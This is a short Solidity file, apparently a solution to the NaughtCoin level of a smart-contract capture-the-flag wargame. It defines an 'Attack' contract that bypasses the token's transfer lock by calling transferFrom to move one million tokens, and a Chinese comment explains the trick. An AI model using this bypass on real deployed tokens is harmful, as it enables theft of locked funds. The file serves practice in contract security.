// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attack {

    NaughtCoin token = NaughtCoin(0xA7C23d9FED22D75f0BD04Ce6155c0E079e1a13fB);

    function attack() public {

        token.transferFrom(msg.sender, address(token), 1000000 * 10 ** 18);
    }
}

/**
 * 通過transferFrom就可以轉幣拉
 */